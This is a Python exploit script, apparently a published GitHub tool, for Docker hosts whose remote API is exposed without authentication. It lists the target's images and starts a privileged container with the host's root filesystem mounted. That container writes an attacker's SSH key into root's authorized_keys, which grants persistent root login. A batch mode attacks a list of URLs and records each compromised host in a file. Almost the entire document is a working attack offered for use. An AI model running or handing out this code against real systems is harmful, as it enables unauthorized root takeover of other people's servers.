import docker
import sys
from colorama import init, Fore, Style

init()

def images_list(url):
    client = docker.DockerClient(base_url=url)
    try:
        images = client.images.list()
        print('Target images list:')
        d1 = {}
        for index, image in enumerate(images, start=1):
            tags = image.tags if image.tags else ['<untagged>']
            d1[index] = tags
            print(f"{Fore.LIGHTBLUE_EX}{index}. {tags}{Style.RESET_ALL}")
        while True:
            try:
                image_index = int(input('Please choose a image or input 0 to quit(Input num): '))
                if image_index == 0:
                    break
                if image_index in d1:
                    image = d1[image_index][0]
                    return image
                else:
                    print(f"Invalid choice. Please enter a number between 1 and {len(d1)}.")
            except ValueError:
                print("Invalid input. Please enter a number.")
    except docker.errors.APIError as e:
        print(f"Error connecting to Docker API: {e}")
    finally:
        client.close()
        return None


def exp(pub_key, url, image):
    client = docker.DockerClient(base_url=url)
    command = f'''sh -c "mkdir -p /mnt/root/.ssh && echo '{pub_key}' >> /mnt/root/.ssh/authorized_keys"'''
    try:
        client.containers.run(
            image,
            command,
            remove=True,
            privileged=True,
            volumes={'/': {'bind': '/mnt', 'mode': 'rw'}}
        )
        print(f'{Fore.GREEN}Operation completed successfully.{Style.RESET_ALL}')
        return True
    except docker.errors.APIError as e:
        print(f"Error running the container: {e}")
        return False
    finally:
        client.close()


if __name__ == '__main__':
    print("""
 ____             _                  _    ____ ___    _   _                   _   _     
|  _ \  ___   ___| | _____ _ __     / \  |  _ \_ _|  | | | |_ __   __ _ _   _| |_| |__  
| | | |/ _ \ / __| |/ / _ \ '__|   / _ \ | |_) | |   | | | | '_ \ / _` | | | | __| '_ \ 
| |_| | (_) | (__|   <  __/ |     / ___ \|  __/| |   | |_| | | | | (_| | |_| | |_| | | |
|____/ \___/ \___|_|\_\___|_|    /_/   \_\_|  |___|   \___/|_| |_|\__,_|\__,_|\__|_| |_|

                                                             By Catherines77
                                                             https://github.com/Catherines77/docker_api_unauth
    \n""")

    if len(sys.argv) != 5:
        print('Usage: python host_exp.py -u url -k ssh_keygen' + '\n')
        print('Param: -u: a target url')
        print('       -k: a ssh pub_key by openssl generated\n')
        print("""Example: python host_exp.py -u http://127.0.0.1:2375 -k "ssh-rsa AAAxxx" 
                """)
        sys.exit(1)

    if sys.argv[1] == '-u':
        url = sys.argv[2]
        pub_key = sys.argv[4]

        try:
            image = images_list(url)
            if image and exp(pub_key, url, image):
                print(f'{Fore.GREEN}Exploitation successful, please use ssh username@target-ip to test.{Style.RESET_ALL}')
        except Exception as e:
            print(f'Connection error : {e}')

    if sys.argv[1] == '-f':
        with open(sys.argv[2], 'r') as f:
            pub_key = sys.argv[4]
            for line in f:
                url = line.strip()
                try:
                    image = images_list(url)
                    if image and exp(pub_key, url, image):
                        print(f'{Fore.GREEN}Exploitation successful, please use ssh username@target-ip to test.{Style.RESET_ALL}')
                        with open('hosts.txt','a') as x:
                            x.write(url.split(':')[0]+'\n')
                except Exception as e:
                    print(f'Connection error : {e}')
